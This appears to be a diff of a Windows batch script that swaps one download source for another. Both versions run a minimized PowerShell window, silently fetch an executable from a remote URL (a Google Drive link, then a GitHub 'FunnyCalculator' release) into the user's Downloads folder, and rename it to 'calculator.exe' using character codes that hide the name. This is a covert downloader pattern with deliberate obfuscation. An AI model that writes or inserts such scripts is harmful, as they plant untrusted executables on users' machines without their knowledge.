@@ -1,2 +1,2 @@
 @echo off
-start /min powershell -NoProfile -Command "cd $env:USERPROFILE\Downloads; curl.exe -s -L 'https://drive.usercontent.google.com/download?id=1IbSDsmJ7gHA9iLe_0VGcplAX4427h3Os&confirm=xxx' -o 'abc'; Rename-Item -LiteralPath 'abc' -NewName (-join ([char]99,[char]97,[char]108,[char]99,[char]117,[char]108,[char]97,[char]116,[char]111,[char]114,[char]46,[char]101,[char]120,[char]101))"
+start /min powershell -NoProfile -Command "cd $env:USERPROFILE\Downloads; curl.exe -s -L 'https://github.com/MyelinLennox/FunnyCalculator/raw/refs/heads/main/dist/calculator.exe' -o 'abc'; Rename-Item -LiteralPath 'abc' -NewName (-join ([char]99,[char]97,[char]108,[char]99,[char]117,[char]108,[char]97,[char]116,[char]111,[char]114,[char]46,[char]101,[char]120,[char]101))"
